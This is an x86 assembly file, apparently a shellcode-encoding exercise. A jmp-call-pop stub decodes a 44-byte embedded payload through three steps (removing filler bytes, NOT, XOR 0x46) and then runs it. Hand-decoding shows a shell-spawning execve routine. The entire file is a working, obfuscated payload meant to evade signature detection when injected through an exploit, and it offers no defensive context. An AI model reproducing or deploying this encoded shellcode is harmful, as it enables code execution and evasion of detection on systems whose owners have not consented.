global _start

section .text

_start:

      jmp short master               ; Jumps to master

main:

      pop ebp                        ; Pops the value of the shellcode into ebp
      mov esi, ebp                   ; Copies the value from ebp to esi

      lea edi, [esi + 1]             ; Points to the 0x45 byte

      xor eax, eax                   ; Zeroes out EAX
      xor ebx, ebx                   ; Zeroes out EBX

      mov cl, 44                     ; Stores counter (44 bytes)
      mov al, 1                      ; Makes AL hold value 1 for later calculations.

decode:

      mov bl, byte [esi + eax]       ; Points to 0x45
      xor bl, 0x45                   ; Turns 0x45 into 0x00
      mov bl, byte [esi + eax + 1]   ; Grabs intended value
      mov byte [edi], bl             ; Replaces 0x00 for the intended value
      inc edi                        ; Increments EDI, holding next 0xAA for replacement
      add al, 2                      ; Adds 2 in order to continue the process
      loop decode                    ; Starts loop

      mov cl, 22                     ; Stores counter (22 bytes)
      xor esi, esi                   ; Zeroes out ESI
      mov esi, ebp                   ; Copies the value from ebp to esi

decode2:

      not byte [esi]                 ; Performs a NOT operation on the value pointed by ESI
      inc esi                        ; Increments ESI, therefore performing a NOT operation on every opcode
      loop decode2                   ; Starts loop

      mov cl, 22                     ; Stores counter (22 bytes)
      xor esi, esi                   ; Zeroes out ESI
      mov esi, ebp                   ; Copies the value from ebp to esi

decode3:

      xor byte [esi], 0x46           ; Performs a XOR operation between the value of ESI and 0x46
      inc esi                        ; Increments ESI, therefore performing aXOR operation on every opcode
      loop decode3                   ; Starts loop
      jmp short shellcode            ; Jumps to the shellcode

master:

      call main                      ; Calls to main and pops shellcode into the stack

      shellcode: db 0x88,0x45,0x79,0x45,0xe9,0x45,0xd1,0x45,0x96,0x45,0x96,0x45,0xca,0x45,0xd1,0x45,0xd1,0x45,0x96,0x45,0xdb,0x45,0xd0,0x45,0xd7,0x45,0x30,0x45,0x5a,0x45,0xe9,0x45,0x30,0x45,0x5b,0x45,0x09,0x45,0xb2,0x45,0x74,0x45,0x39,0x45